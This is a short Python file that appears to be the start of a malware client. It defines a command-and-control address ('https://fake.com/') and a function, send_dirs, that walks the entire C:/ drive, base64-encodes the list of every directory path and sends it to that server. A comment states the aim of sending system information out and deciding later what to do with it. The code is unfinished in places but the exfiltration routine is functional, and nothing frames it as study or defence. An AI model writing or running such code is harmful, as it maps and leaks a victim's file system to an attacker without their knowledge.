from requests import get,post
from base64 import urlsafe_b64decode,urlsafe_b64encode
import os

CC_SERVER = "https://fake.com/"
#//SEND INFORMATION ABOUT THE SYSTEM, AND DECIDE WHAT TO DO WITH IT LATER
def get_request(url : str,params : list,headers=None):
    #//TODO: this
    if not headers:
        get(url,params)
        return
    else:
        get(url,params,headers=headers)


def send_dirs():
    all_dirs = []
    for root,dirs,files in os.walk('C:/'):
        for d in dirs:
            all_dirs.append(os.path.join(root,d))
    all_dirs = urlsafe_b64encode(str(all_dirs).encode()).decode()
    return get(CC_SERVER,all_dirs)




